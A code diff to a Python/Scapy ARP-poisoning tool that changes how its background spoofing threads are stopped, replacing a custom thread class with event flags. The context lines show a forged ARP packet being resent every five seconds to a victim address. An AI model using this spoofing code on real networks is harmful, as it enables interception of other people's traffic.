@@ -39,25 +39,6 @@ if sys.version_info[0] >= 3:
 elif sys.version_info[0] < 3:
     input = raw_input
 
-class ThreadV2(threading.Thread):
-    """Implement a stop method
-
-    Args:
-        object (_type_): _description_
-
-    Returns:
-        _type_: _description_
-    """
-    def __init__(self,  *args, **kwargs):
-        super(ThreadV2, self).__init__(*args, **kwargs)
-        self._stop_event = threading.Event()
-    
-    def stop(self):
-        self._stop_event.set()
-    
-    def stopped(self):
-        return self._stop_event.is_set()
-
 class ARPP(object):
     def __init__(self):
         self.SELECTED_INTERFACE = None
@@ -69,6 +50,7 @@ class ARPP(object):
             "select interface":self.select_interface,\
             "end ARP poisoning processes": self.end_ARP}
         self.THREADED_TASKS = []
+        self.EVENTS = []
     
     def _get_my_ip(self):
         my_ip = get_if_addr(self.SELECTED_INTERFACE) # this variable is a string
@@ -204,13 +186,18 @@ class ARPP(object):
         pkt[ARP].pdst  = ipVictim
         
         print("ARP spoofing started")
-        def rec():
+        e = threading.Event()
+        def rec(event: threading.Event):
             while True:
+                if event.isSet():
+                    break
                 sendp( pkt, iface=self.SELECTED_INTERFACE, verbose=False )
                 sleep(5)
         
-        T = ThreadV2(target=rec, name="Spoofing {} -> {}".format(ipToSpoof, ipVictim))
+        T = threading.Thread(target=rec, name="Spoofing {} -> {}".format(ipToSpoof, ipVictim), args=(e,))
+        
         self.THREADED_TASKS.append(T)
+        self.EVENTS.append(e)
         self.THREADED_TASKS[-1].start()
         
     def end_ARP(self):
@@ -222,12 +209,15 @@ class ARPP(object):
                 print("{}: {}".format(i, task.getName()))
         
         try:
-            task_to_kill = int(raw_input("Task to terminate>>"))
-            for task in self.THREADED_TASKS:
-                if task.getName() == alive_tasks_names[task_to_kill]:
-                    task.stop()
-                    task.stopped()
-                    task.join()
+            ttk_id = int(raw_input("Task to terminate>>"))
+            # for task in self.THREADED_TASKS:
+            #     if task.getName() == alive_tasks_names[ttk_id]:
+            #         task.stop()
+            #         task.stopped()
+            #         task.join()
+            self.EVENTS[ttk_id].set() # stops the thread
+            del self.THREADED_TASKS[ttk_id] # remove thread from list of threads 
+            del self.EVENTS[ttk_id] # remove the event corresponding to the thread also
         except:
             tb = traceback.format_exc()
             print(tb)
